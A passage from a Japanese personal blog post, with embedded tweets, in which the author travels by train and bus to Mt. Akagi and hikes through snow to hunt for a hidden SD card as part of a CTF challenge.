同じ関東だし翌日9時頃に家を出ればその日のうちに帰ってこれるだろ、と高を括り、お布団に入って熟睡し翌日に備えました。
今思えばこの時点で<strong>エクストリームCTF</strong>が始まっていました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>明日は10時頃大学行って11時ごろ電車乗って14時ごろ登山開始ってところかな（）</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584723697740582913">2015, 4月 5</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>ヤマノススメするぞといった気持ち</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584858646346989568">2015, 4月 5</a></blockquote>




<iframe src="http://rcm-fe.amazon-adsystem.com/e/cm?lt1=_blank&bc1=000000&IS2=1&bg1=FFFFFF&fc1=000000&lc1=0000FF&t=mzyy-22&o=9&p=8&l=as4&m=amazon&f=ifr&ref=ss_til&asins=B00L3NPW7E" style="width:120px;height:240px;" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>


<h2>当日</h2>

<p>ぐっすりと睡眠をとり、目覚めのコーヒーと朝食の調理パンを食べて赤城山に向かう準備を始めます。</p>

<blockquote class="twitter-tweet" lang="ja"><p>とりあえず登山グッズはこんなもんか <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/pXQj4G5MdH">pic.twitter.com/pXQj4G5MdH</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584861432895811585">2015, 4月 5</a></blockquote>


<p>MBA,パン,水分,チョコレート,革手袋,コンパクトダウンジャケット,モバイルバッテリーにSDカードリーダーを持っていざ出発です。</p>

<h3>午前の部　電車乗り換え編</h3>

<blockquote class="twitter-tweet" lang="ja"><p>行くぜ関東 <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ つくば駅 (Tsukuba Sta.) in つくば市, 茨城県) <a href="https://t.co/DUWnj3m167">https://t.co/DUWnj3m167</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584874102009266176">2015, 4月 6</a></blockquote>


<p>自宅の最寄駅のつくば駅からつくばエクスプレスに乗り、赤城山の最寄駅である前橋駅へ向かいます。
つくばエクスプレスの電車の中で検索したところ経路としては、流山おおたかの森駅乗り換えで東武鉄道を使う行き方と、
南流山乗り換えでJRを使って行く方法がありました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/train-connections.png" alt="train-connections" /></p>

<p>JRでは移動距離100km以上だったので学割が使えますが、電車内での決断は以下のようになりました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>JRでSDカード発掘に行くつもりだったけど時間ずらすと東武の方が安いことに気づいて学割使わなんだ</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584881057205395456">2015, 4月 6</a></blockquote>


<p>この時は後にある過酷な乗り換えが待っていることも知らず、運賃の安さで流山おおたかの森駅での乗り換えを選択しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>TX乗り換え <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ つくばエクスプレス 流山おおたかの森駅 in 流山市, 千葉県) <a href="https://t.co/PTvNeocyiw">https://t.co/PTvNeocyiw</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584879354540388352">2015, 4月 6</a></blockquote>


<p>東武鉄道へと乗り換え、電車の中で前橋駅から赤城山へのバスの時刻表を調べ始めます。ここで衝撃の事実を知ることになります。</p>

<blockquote class="twitter-tweet" lang="ja"><p>やべぇ登山口へのバスの本数少なすぎるw <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584885349471498242">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>ちょっと！kanto1最寄り駅から1日5本しかバス出てないってどういうことおかしいでしょ！！ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584885739130716160">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>5本じゃない4本だし！！！ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584885923290030082">2015, 4月 6</a></blockquote>


<p>衝撃です。平日の前橋駅発赤城山行きのバスは4本しかなく、4本目が最終折り返し便という記載がバス時刻表にあることを初めて知りました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/bus-table.png" alt="bus-table" /></p>

<p>平日の前橋駅発富士見温泉経由赤城山行きの出発時刻は7:32、10:35、13:27、15:28の4本しかなく、15:28の便が最終折り返し便なので、なんとしてでも13:27のバスに乗らなければならない状況に立たされていることを知ります。
悠長に電車旅を続けられる状態ではなくなりました。本数の少ない路線を乗り継いでいるため、一つでも乗り換えを間違えたり間に合わなかったりすると13:27のバスに間に合わず、そこでmondai10へのチャレンジ終了となります。</p>

<p>ギリギリの乗り換えを迫られているがため、春日部駅で10:26発の久喜行きの電車が目の前で去った時は、乗り換え失敗をしたと勘違いし、焦ってこんなツイートをしていました（乗り換え案内によると10:36発の久喜行きに乗ればよいとのことでした）。</p>

<blockquote class="twitter-tweet" lang="ja"><p>あかん乗り換えミスったやばいぞ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 春日部駅 (Kasukabe Sta.) in 春日部市, 埼玉県) <a href="https://t.co/4d9tnWBHpQ">https://t.co/4d9tnWBHpQ</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584890215510192129">2015, 4月 6</a></blockquote>


<p>なんとか春日部駅での乗り換えを成功し、電車の中でこんなことを考えていました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>新幹線乗ればよかった感</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584891590436454400">2015, 4月 6</a></blockquote>


<p>運賃をできるだけ安く済ませようと、有料特急を乗り換え案内の検索条件から外していたのですが、埼玉県の大宮駅で新幹線に乗って群馬県の高崎駅へ行く経路をとれば、乗り換えも少なく、時間に余裕を持って前橋駅まで行くことができたのです。</p>

<p>続く2駅も、途中2分という短い乗り換え時間でありながらも、乗り遅れることなく無事乗り換えることに成功しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 久喜駅 (Kuki Sta.) in 久喜市, 埼玉県) <a href="https://t.co/Xm0SXXYVs7">https://t.co/Xm0SXXYVs7</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584895933697159168">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>乗り換え可能時間2分しかないぞ</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584903863565594624">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>乗り換え成功 <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 館林駅 (Tatebayashi Sta.) in 館林市, 群馬県) <a href="https://t.co/zCyWnEyjHF">https://t.co/zCyWnEyjHF</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584905684585750528">2015, 4月 6</a></blockquote>


<p>さて、普通にプラットホームを移動して乗り換えするだけでよかったのはこの館林駅まで。次の乗り換え駅である足利市駅では時間との戦いが待っているのです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/running-connection.png" alt="running-connection" /></p>

<p>足利市駅での乗り換えでは、違う路線の駅間を歩いて移動しなければならないのです。この乗り換えの最大の難関は移動時間。足利市駅に11:47に到着し足利駅の発車時刻は12:05で、その間の時間は18分しかありません。徒歩での経路をiOSのマップで調べてみると、予想所要時間は18分となっています。迷ったり道を間違えたりしていたら乗り損ねてしまい、mondai10チャレンジ終了となります。</p>

<blockquote class="twitter-tweet" lang="ja"><p>東武鉄道遅延情報出てないのに遅延してるクズっぽい</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584910433590517760">2015, 4月 6</a></blockquote>


<p>追い討ちをかけるように、東武鉄道は2分ほど足利市駅への到着が遅れていました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>駅間ダッシュだっ！ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 足利市駅 (Ashikagashi Sta.) in 足利市, 栃木県) <a href="https://t.co/nvG8VXUlrI">https://t.co/nvG8VXUlrI</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584910796683157504">2015, 4月 6</a></blockquote>


<p>11:49に駅に到着し、足利駅への移動を開始します。</p>

<blockquote class="twitter-tweet" lang="ja"><p>いきなり迷ってる <a href="https://twitter.com/hashtag/%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%88%E3%83%AA%E3%83%BC%E3%83%A0CTF?src=hash">#エクストリームCTF</a> <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584911355313917953">2015, 4月 6</a></blockquote>


<p>駅の出口が2方向にあり、どちらに出ればいいかわからず、さらに出口から出たところで道らしき道が見当たらなかったため、2分ほど迷ってしまいました。</p>

<p>iPhoneの電子コンパスを使って方角を確かめ、正しい出口から出てマップを頼りに急いで移動を開始します。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/connection-map.png" alt="connection-map" /></p>

<p>駅間の移動中の風景はとてものどかで、ゆっくりとした時間が流れているようでした。ゆっくりと時間が流れて欲しいと思っていたからかもしれませんが。
橋を渡っている時に撮った渡良瀬川の風景は、特に面白みがなく自然な感じでした。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/v9Jca4uFE4">pic.twitter.com/v9Jca4uFE4</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584911834458689536">2015, 4月 6</a></blockquote>


<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2374.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2374_thumb.JPG" alt="IMG_2374.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2375.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2375_thumb.JPG" alt="IMG_2375.JPG" /></a></p>

<p>のんびりと写真を撮っていたからでしょうか、駅まで残り250mの地点ですでに電車出発まで残り2分を切ってしまいました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/last_250m.png" alt="last_250m" /></p>

<p>猛ダッシュするしかありません。幸い、信号のある道ではなかったので歩道を存分に走って駅に向かうことができました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>ギリッギリw <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 足利駅 (Ashikaga Sta.) in 足利市, 栃木県) <a href="https://t.co/tkic86CCmO">https://t.co/tkic86CCmO</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584914938298261504">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>最後猛ダッシュだったわw <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584915058506870784">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>あと30秒遅かったらリタイアだったわ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584915558820225025">2015, 4月 6</a></blockquote>


<p>駅の改札を通ると高崎行き方面のホームにはすでに電車が！ふくらはぎパンパンになりながらも階段を駆け上がり、なんとか電車に間に合い乗ることができました。</p>

<p>ちなみに足利駅には電車が飾ってありました。（こんなの撮影してないで急げというツッコミはなしで）</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2379.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2379_thumb.JPG" alt="IMG_2379.JPG" /></a></p>

<p>最後の乗り換えを終え、あとは前橋駅で降りるだけとなりました。なんとか電車で赤城山最寄駅までこぎつけることができる状態となり、これにて過酷な電車乗り換え編はおしまいとなります。</p>

<blockquote class="twitter-tweet" lang="ja"><p>とりあえず エクストリームCTF 午前の部 電車編 はクリアできたっぽいです</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584918614555238401">2015, 4月 6</a></blockquote>


<h3>昼の部　バス乗り換え編</h3>

<blockquote class="twitter-tweet" lang="ja"><p>エクストリームCTF 昼の部 バス編開始です <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 前橋駅 (Maebashi Sta.) in 前橋市, 群馬県) <a href="https://t.co/djgY3NCMZ9">https://t.co/djgY3NCMZ9</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584927608808288256">2015, 4月 6</a></blockquote>


<p>へとへとになりながらも降りそびれることなく、前橋駅に到着しました。</p>

<p>バスターミナルを回り、富士見温泉経由で赤城山に向かうバスを探します。</p>

<blockquote class="twitter-tweet" lang="ja"><p>この13:27で行けるはず… <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 前橋駅バスターミナル in 前橋市, 群馬県) <a href="https://t.co/zRGB3P2gof">https://t.co/zRGB3P2gof</a> <a href="http://t.co/utCcwl1PVN">pic.twitter.com/utCcwl1PVN</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584928918194540544">2015, 4月 6</a></blockquote>


<p>事前に（電車内で）調べてあった13:27発のバスがありました。しかし富士見温泉終点と書いてあるこのバスで本当に赤城山へ行けるか心配になり、バス案内所へ行きどの便でいけるのかを聞いてきました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>心配になってバス案内所で聞いてきたら13:27の便であってた <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/s2Hfmuv4Jc">pic.twitter.com/s2Hfmuv4Jc</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584931886155239425">2015, 4月 6</a></blockquote>


<p>この13:27発の電車であっていたようです。一度富士見温泉で赤城山ビジターセンター行きのバスに乗り換えをする必要があるとのことでした。</p>

<p>案内所にあったバス停の停車場所の地図から、SDカードがある場所に一番近いバス停を探します。Google Mapによると、赤城山ビジターセンターまで行ってしまうと大回りとなってしまうとのことで、その一つ前の赤城山大洞で降りると、山道を通って最短経路で行けるとのことでした。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/bus-stop-route.png" alt="bus-stop-route" /></p>

<p>時間になり、バスが来たので乗車しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>バス乗った　<a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584934452813365248">2015, 4月 6</a></blockquote>


<p>ここで想定していなかった事態が発生します。</p>

<blockquote class="twitter-tweet" lang="ja"><p>雨降ってきたし！！！</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584934838643195904">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>雨降るなんて聞いてないよ！！！ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584934887217500160">2015, 4月 6</a></blockquote>


<p>天気予報では&#8221;晴れ&#8221;となっていたので雨具など用意していません。しかもバスに乗るまで20分ほど待ち時間があったので、乗車前に降りそうな予感がしていれば雨合羽を買うことすらできただけに、最悪のタイミングで雨が降ってきました。このままSDカードを見つけることができるのかと、とても不安になってきました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>まんがタイムきららのドキドキビジュアルコミックス以上にドキドキしてる</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584937029898612736">2015, 4月 6</a></blockquote>


<p>ぼーっと外を眺めていても、雨粒と曇天とでかい鳥居くらいしかなく、ぜんぜん落ち着きませんでした。</p>

<blockquote class="twitter-tweet" lang="ja"><p>でかい鳥居だ <a href="http://t.co/9xRZJc8ODm">pic.twitter.com/9xRZJc8ODm</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584941636108451840">2015, 4月 6</a></blockquote>


<p>そうこうしていると富士見温泉バス停に着き、乗り換えをしました。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 富士見温泉バス停) <a href="https://t.co/NDft6XwqIr">https://t.co/NDft6XwqIr</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584943568017588224">2015, 4月 6</a></blockquote>


<p>赤城山ビジターセンター行きのバスに乗ると、風景に大きな山が見えてきました。たぶん赤城山です。たぶん。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2388.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2388_thumb.JPG" alt="IMG_2388.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2391.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2391_thumb.JPG" alt="IMG_2391.JPG" /></a></p>

<p>バスで揺られて眠くなる中、標高1000mを越えたあたりから車窓から覗く景色が明るくなっていることに気づきます。</p>

<blockquote class="twitter-tweet" lang="ja"><p>標高1000m超えた</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584950108011110400">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>残雪があるぞ…</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584951262354939905">2015, 4月 6</a></blockquote>


<p>そう、残雪が景色を明るくしていたのです。また、赤城山大沼という湖は湖面が凍っていました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2395.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2395_thumb.JPG" alt="IMG_2395.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2398.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2398_thumb.JPG" alt="IMG_2398.JPG" /></a></p>

<p>赤城山大洞バス停に到着し、降車します。降りるとき、バスの運転手にこう告げられました。</p>

<blockquote><p>バス停が雪に埋まってるから帰りは降りた位置辺りにいれば止まるよ</p></blockquote>

<p>嫌な予感しかしません。</p>

<p>ここから想像をはるかに超える過酷な登山が始まります。</p>

<h3>午後1　登山編</h3>

<blockquote class="twitter-tweet" lang="ja"><p>さぁ、登山開始だ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 赤城山第1スキー場 in 前橋市, 群馬県) <a href="https://t.co/tHRXadHe4S">https://t.co/tHRXadHe4S</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584954825294684160">2015, 4月 6</a></blockquote>


<p>バス停を降りてすぐのところで登山者向けの案内看板を見つけました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2399.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2399_thumb.JPG" alt="IMG_2399.JPG" /></a></p>

<p>この看板の略図にある地蔵岳を越えてゆくコースを通ってSDカードの場所へと向かいます。看板の凡例にあるように、通る道は<strong>歩道</strong>となっているので比較的楽に登ることができると思いまいした。その歩道とやらはどこにあるのかとあたりを見渡すと、アスファルトで舗装された道がみつかりました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>どうすんだよこれ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/3DeQWYKK8V">pic.twitter.com/3DeQWYKK8V</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584955092714950656">2015, 4月 6</a></blockquote>


<p>かろうじてアスファルトの道であるとわかる雪に覆われた登山道を見つけます。100mほど先を見ると、アスファルトはすべて雪に覆われ見えなくなっています。
完全に想像していなかった事態です。春になり暖かくなってきていたので、こんなにも雪が積もっているなんて考えていませんでした。
出発前の甘い考えがここで思い出されます。</p>

<blockquote class="twitter-tweet" lang="ja"><p>ヤマノススメするぞといった気持ち</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584858646346989568">2015, 4月 5</a></blockquote>




<iframe src="http://rcm-fe.amazon-adsystem.com/e/cm?lt1=_blank&bc1=000000&IS2=1&bg1=FFFFFF&fc1=000000&lc1=0000FF&t=mzyy-22&o=9&p=8&l=as4&m=amazon&f=ifr&ref=ss_til&asins=B00L3NPW7E" style="width:120px;height:240px;" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>


<p>何も下調べせずに来てしまったことを強く後悔しました。
事前にしっかりと下調べしていれば、1800m超級の山にはまだ雪が残っているというのは安易に想像がつきます。小爪アイゼン装備のブーツを持ってくることもできたのです。</p>

<p>よく滑る雪道を数十メートル進み、湖の方を眺めると大きな山がこちらを見守ってくれていました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2403.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2403_thumb.JPG" alt="IMG_2403.JPG" /></a></p>

<p>刻々と帰りのバスの時間が迫ってきているので、後悔はほどほどに先に進みます。</p>

<blockquote class="twitter-tweet" lang="ja"><p>やばい(確信) <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/NsTmOr6ZL2">pic.twitter.com/NsTmOr6ZL2</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584956357419241472">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>なんで沢登りせにゃならんのだw <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/5c72fEWBQc">pic.twitter.com/5c72fEWBQc</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584958094637015040">2015, 4月 6</a></blockquote>


<p>膝上まで沈む深い雪があるところや、雪解け水で小川ができているところを水浸しになりながらかけ進んでいきます。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2405.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2405_thumb.JPG" alt="IMG_2405.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2410.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2410_thumb.JPG" alt="IMG_2410.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2412.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2412_thumb.JPG" alt="IMG_2412.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2413.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2413_thumb.JPG" alt="IMG_2413.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2414.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2414_thumb.JPG" alt="IMG_2414.JPG" /></a></p>

<blockquote class="twitter-tweet" lang="ja"><p>Googleさんの案内相当険しかったですね。。これマップの地点の画像です <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/OthdUPcczu">pic.twitter.com/OthdUPcczu</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584976426962530305">2015, 4月 6</a></blockquote>


<p>20分ほど登ったでしょうか、地蔵岳の登山道を抜け、車道に出てきました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2415.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2415_thumb.JPG" alt="IMG_2415.JPG" /></a></p>

<p>やっと雪道から解放されました。</p>

<p>少し進むと小沼という湖がでてきました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2416.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2416_thumb.JPG" alt="IMG_2416.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2417.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2417_thumb.JPG" alt="IMG_2417.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2418.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2418_thumb.JPG" alt="IMG_2418.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2419.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2419_thumb.JPG" alt="IMG_2419.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2420.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2420_thumb.JPG" alt="IMG_2420.JPG" /></a></p>

<p>標高1450m地点とのことです。あと一息で目的地周辺です。
凍った湖を左手に眺めながら車道脇をてくてくと歩き進んでいきます。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2422.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2422_thumb.JPG" alt="IMG_2422.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2424.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2424_thumb.JPG" alt="IMG_2424.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2425.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2425_thumb.JPG" alt="IMG_2425.JPG" /></a>
<img src="http://mzyy94.com/blog/resources/images/2015/04/16/route-to-dest.png" alt="route-to-dest.png" /></p>

<p>目的地周辺まで来ました。このときiPhoneの電波は圏外となっていました。</p>

<p>ここからは車道を外れて森の中へと捜索しに行きます。</p>

<h3>午後2　捜索編</h3>

<p>登山道が60cm超の雪まみれだったのにもかかわらず、SDカードが隠されている森は数cmの雪しかありませんでした。
不幸中の幸いというものですね。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2428.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2428_thumb.JPG" alt="IMG_2428.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2429.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2429_thumb.JPG" alt="IMG_2429.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2431.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2431_thumb.JPG" alt="IMG_2431.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2433.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2433_thumb.JPG" alt="IMG_2433.JPG" /></a></p>

<p>道無き道を突き進んでいたのですが、途中で道らしきものを見つけそちらを歩き始めました。
すると、看板とともに分岐点があらわれました。</p>

<p>GPSによると、血の池方面に行けばよさそうなので、そちらへ進んでいきます。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2435.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2435_thumb.JPG" alt="IMG_2435.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2437.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2437_thumb.JPG" alt="IMG_2437.JPG" /></a></p>

<p>血の池に着くと、血の池にまつわる伝説と池の由来が書かれた看板がありました。
この看板を読んでいると、すこし前に目にした単語を見つけました。
そう、hint7.txtに記載のあった<strong>ヤマヒゲナガケンミジンコ</strong>です。
